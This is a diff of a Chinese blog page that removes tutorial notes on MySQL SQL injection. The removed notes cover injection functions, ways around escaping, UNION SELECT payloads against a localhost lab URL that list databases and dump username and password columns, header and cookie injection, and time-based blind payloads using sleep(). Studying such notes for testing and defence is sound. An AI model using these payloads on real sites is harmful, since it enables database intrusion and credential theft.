@@ -249,23 +249,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <pre><code>version()  MySQL 版本
-user()  数据库用户名
-database() 数据库名
-@@datadir 数据库路径
-@@version_compile_os  操作系统版本
-hex() 把十进制转为十六进制
-concat() 连接字符串
-ascii() ascii编码
-length() 获取长度
-substring() mid（） 取出字符串
-group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据
-updatexml()、extractvalue() 用于报错注入
-sleep（）  休眠</code></pre><p>魔术引号<br> magic_quotes_gpc 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>安全函数<br>addslashes()<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。<br>绕过思路<br>编码绕过<br>宽字节绕过<br>Mysql高权限垮库注入<br>需要root权限<br>网站A 无注入 网站B有MYSQL注入 并且被统一管理的话<br>可以实现Mysql高权限垮库注入<br>查询所有库名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata<br>获取指定数据库的所有表名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=十六进制dataname<br>获取指定表的列名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name=十六进制tablename</p>
-<p>获取指定数据<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,username,userpwd from ekucms.ekud249_user<br>提交方式注入<br>POST登录框注入<br>先加’在构建SQL注入语句<br>Cookie验证注入<br>抓包改包注入<br>HTTP头部注入<br>实际情况下，有部分站点接受数据是以http数据包中的http头部进去数据接受，所以测试注入点的时候，需要将注入语句写到http头部中<br>写到该写的地方<br>参数类型注入<br>数字，字符，搜索<br>数字型：<br>$id=$_GET[‘x’]<br>Select * from news where id=1<br>字符型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’admin’<br>先加’ 再构建SQL语句<br>搜索型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’%mst%’<br>先加%’ </p>
-<p>加解密注入<br>常用加密方式<br>URL编码 base64 …..</p>
-<p>普通联合注入和盲注区别<br>普通注入：效率高 兼容性差<br>盲注：效率低 兼容性高<br>基于时间延长注入<br>Sleep()延时<br>If(条件,真,假)条件判断<br>Mid(str,1,1) 截取<br>Ord ascii()<br>Length()<br>获取数据库名长度<br><a href="http://127.0.0.1/sql/0.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=1</a> and sleep(if((select length(database()) = 7),0,5))<br>获取表名<br>Union select 1,2,3 sleep(if(length(table_name) = 4,0,5)) from information_schema.tables where table_schema =database() limit 0,1</p>
-
+        <p>常用函数</p>
+        
       
 
       
